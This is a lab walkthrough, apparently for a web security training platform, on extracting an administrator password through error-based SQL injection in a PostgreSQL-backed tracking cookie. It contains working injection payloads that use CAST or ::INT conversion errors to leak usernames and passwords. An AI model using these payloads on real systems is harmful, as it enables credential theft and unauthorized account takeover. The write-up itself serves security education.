# 📝 Lab: Visible Error-Based SQL Injection

* **Vulnerability:** SQL Injection (Error-Based)
* **Difficulty:** PRACTITIONER
* **Objective:** Log in as the `administrator` user.

> **Description**
>
> This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query using the value of the submitted cookie. The query results are not returned directly in the response.
>
> The database contains a table called `users` with the columns `username` and `password`.
>
> To solve the lab, we need to abuse error-based SQL injection to leak the administrator's password and then log in using the exposed credentials.

---

## 🛠️ Tools Used

* Browser + FoxyProxy
* Burp Suite
* Python (optional)

---

## 🐾 Steps to Reproduce

### 1. Intercept the Request

Open the lab homepage and intercept the request using **Burp Suite**.

Navigate to:

```text
Proxy → HTTP History
```

Right-click the request and send it to **Repeater** (`Ctrl + R`).

---

### 2. Identify the Injection Point

The `TrackingId` cookie is the vulnerable parameter.

Start with a simple syntax test:

```sql
'AND (SELECT 1)--
```

The application responds with an error indicating that a proper boolean expression is required. This is a good sign that our input is reaching the SQL query.

---

### 3. Confirm SQL Injection

Use a valid boolean condition:

```sql
'AND 1=(SELECT 1)--
```

If the response returns **HTTP 200 OK**, the injection is confirmed.

---

### 4. Trigger Type Conversion Errors

Since the query expects an integer value, try selecting data from the `users` table:

```sql
'AND 1=(SELECT username FROM users)--
```

The application returns an error indicating an **INTEGER** type is expected.

To force the database to convert the value and reveal the contents through an error message, use either:

```sql
'AND 1=((SELECT username FROM users)::INT)--
```

or

```sql
'AND 1=CAST((SELECT username FROM users) AS INT)--
```

At this point, another error appears because the subquery returns multiple rows.

---

### 5. Limit the Result to a Single Row

Add `LIMIT 1` so that only one row is returned:

```sql
'AND 1=((SELECT username FROM users LIMIT 1)::INT)--
```

The database now tries to convert the username into an integer and throws an error similar to:

```text
invalid input syntax for type integer: "administrator"
```

This error leaks the value directly in the response.

> **Tip:** If the response complains about cookie length or payload size, remove the original cookie value before injecting your payload.

You can also retrieve different rows by using `OFFSET`:

```sql
LIMIT 1 OFFSET 1
LIMIT 1 OFFSET 2
```

---

### 6. Leak the Administrator Password

Once you confirm that usernames can be extracted, simply replace `username` with `password`:

```sql
'AND 1=((SELECT password FROM users WHERE username='administrator')::INT)--
```

The conversion error will now reveal the administrator's password in the response:

```text
invalid input syntax for type integer: "password_here"
```

---

### 7. Log In as Administrator

Use the leaked credentials to authenticate:

```text
Username: administrator
Password: <leaked_password>
```

After a successful login, the lab is solved.

---

### 8. Verify the Solution

Once logged in as the administrator user, the **"Lab Solved"** banner will appear.

---

## 💣 Payload

### Confirm SQL Injection

```sql
'AND 1=(SELECT 1)--
```

**Purpose:**
Verifies that user-controlled input is being evaluated inside the SQL query.

---

### Leak a Username Through a Type Conversion Error

```sql
'AND 1=((SELECT username FROM users LIMIT 1)::INT)--
```

**Purpose:**
Forces PostgreSQL to convert a string value into an integer, causing an error that leaks the username in the response.

---

### Alternative Syntax

```sql
'AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
```

**Purpose:**
Same technique as above, but using `CAST()` instead of PostgreSQL's `::INT` syntax.

---

### Leak the Administrator Password

```sql
'AND 1=((SELECT password FROM users WHERE username='administrator')::INT)--
```

**Purpose:**
Triggers a conversion error containing the administrator's password.

---

### Enumerate Other Rows

```sql
'AND 1=((SELECT username FROM users LIMIT 1 OFFSET 1)::INT)--
```

```sql
'AND 1=((SELECT username FROM users LIMIT 1 OFFSET 2)::INT)--
```

**Purpose:**
Moves through different rows in the table when enumeration is required.

---

## 🎯 Impact

This vulnerability allows an attacker to retrieve sensitive information directly from the database through error messages, even when query results are not reflected in the application's response.

In this lab, the attacker can:

* Confirm the existence of a SQL injection vulnerability.
* Extract database content using error-based techniques.
* Enumerate usernames stored in the `users` table.
* Retrieve the administrator's password without direct database access.
* Gain unauthorized access to the administrator account.
* Completely bypass authentication controls.
* Potentially access, modify, or delete sensitive application data depending on database privileges.

**Risk:** High

**Attack Complexity:** Low

**Privileges Required:** None

**Potential Business Impact:**
A successful attacker could compromise administrative accounts, access confidential data, and fully take over application functionality.

---

## 🔗 Reference

For more SQL injection payloads and database-specific syntax, check out the **[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**
